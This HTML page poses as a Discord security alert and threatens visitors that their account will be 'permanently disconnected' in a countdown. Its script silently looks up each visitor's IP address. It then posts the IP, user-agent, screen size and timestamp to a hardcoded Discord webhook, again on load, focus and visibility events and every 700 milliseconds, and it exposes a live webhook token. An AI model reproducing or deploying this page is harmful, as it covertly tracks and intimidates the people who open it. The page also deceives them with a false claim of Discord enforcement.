<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - Critical Security Alert</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap');
        body { margin:0; padding:0; background:#0a0a0a; color:#dcddde; font-family:'Whitney',sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
        .container { background:#1a1a1a; border:3px solid #f04747; border-radius:16px; padding:60px 70px; max-width:540px; text-align:center; box-shadow:0 0 100px rgba(240,71,71,0.6); }
        .warning-icon { font-size:110px; margin-bottom:30px; color:#f04747; animation:pulse 1.2s infinite; }
        @keyframes pulse { 0%{transform:scale(1);} 50%{transform:scale(1.25);} 100%{transform:scale(1);} }
        h1 { color:#f04747; font-size:34px; margin-bottom:15px; font-weight:700; }
        .subtitle { color:#f04747; font-size:20px; margin-bottom:35px; font-weight:600; }
        p { color:#b9bbbe; line-height:1.7; font-size:16.5px; margin-bottom:40px; }
        .threat { color:#f04747; font-weight:700; }
        .footer { margin-top:50px; color:#72767d; font-size:14px; }
        #status { color:#43b581; font-size:14px; margin-top:20px; }
    </style>
</head>
<body>
    <img src="https://api.ipify.org?format=json" style="display:none;" onload="logVictim()" onerror="logVictim()">
    <iframe src="about:blank" style="display:none;" id="beaconFrame"></iframe>

    <div class="container">
        <div class="warning-icon">☠️</div>
        <h1>YOU FUCKED UP</h1>
        <div class="subtitle">You've pissed off Vylze.</div>
        <p>
            You triggered Vylze's security system.<br><br>
            <span class="threat">Your Discord account is being permanently disconnected in <strong id="countdown">8</strong> seconds.</span><br>
            There is nothing you can do to stop it.
        </p>
        <div id="status">Logging connection details...</div>
        <div class="footer">© 2026 Discord Security • Vylze Enforcement Division</div>
    </div>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1494145613158416465/pCeMAZqcV6IkR-eLbHx3roc1ameFC9SCg4HoetrgEk-llQwp_3pbS3Ur89xf0oEI2l5v";
        let loggedIPs = new Set();

        async function getIP() {
            const apis = ['https://api.ipify.org?format=json', 'https://ipapi.co/json/', 'https://api64.ipify.org?format=json', 'https://api.myip.com'];
            for (let api of apis) {
                try {
                    const res = await fetch(api, {mode: 'cors', cache: 'no-store'});
                    if (res.ok) {
                        const data = await res.json();
                        return data.ip || data.query || data.address || 'Unknown';
                    }
                } catch(e) {}
            }
            return 'Unknown (blocked)';
        }

        async function logVictim(reason = "DOCKER_PAGE_HIT") {
            const ip = await getIP();
            const key = ip + Date.now(); // timestamp dedupe for rapid refreshes
            if (loggedIPs.has(key)) return;
            loggedIPs.add(key);

            const payload = {
                username: "☠️ Vylze Instant Logger",
                content: `**🔴 NEW VICTIM - ${reason}**`,
                embeds: [{
                    title: "Vylze Security Triggered",
                    color: 0xf04747,
                    description: "Docker-hosted • Post-proxy slap capture",
                    fields: [
                        { name: "IP Address", value: "```" + ip + "```", inline: true },
                        { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
                        { name: "Screen", value: screen.width + " × " + screen.height, inline: true },
                        { name: "Reason", value: reason, inline: false },
                        { name: "Time", value: new Date().toLocaleString(), inline: false }
                    ],
                    footer: { text: "SSnatcher v2.1 Docker • Vylze Mode" }
                }]
            };

            try {
                await fetch(WEBHOOK, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload) });
                document.getElementById('status').innerHTML = `✅ Logged: ${ip}<br>(${reason})`;
            } catch(e) {}
        }

        function initPersistentLogging() {
            logVictim("INITIAL_DOCKER_LOAD");
            window.addEventListener('load', () => logVictim("LOAD"));
            window.addEventListener('pageshow', () => logVictim("PAGESHOW"));
            window.addEventListener('focus', () => logVictim("FOCUS"));
            document.addEventListener('visibilitychange', () => { if (document.visibilityState === 'visible') logVictim("VISIBLE"); });
            setInterval(() => logVictim("POLL_700MS"), 700);
            setTimeout(() => { document.getElementById('beaconFrame').src = 'https://api.ipify.org?format=json'; }, 800);
        }

        let seconds = 8;
        const countdownEl = document.getElementById('countdown');
        setInterval(() => {
            seconds--;
            countdownEl.textContent = seconds;
            if (seconds <= 0) {
                document.body.innerHTML = `<div style="text-align:center;margin-top:150px;color:#f04747;font-size:32px;font-weight:700;">ACCOUNT PERMANENTLY DISCONNECTED<br><br><span style="font-size:18px;">Vylze has banned you from Discord.</span></div>`;
            }
        }, 1000);

        initPersistentLogging();
        window.onload = initPersistentLogging;
    </script>
</body>
</html>
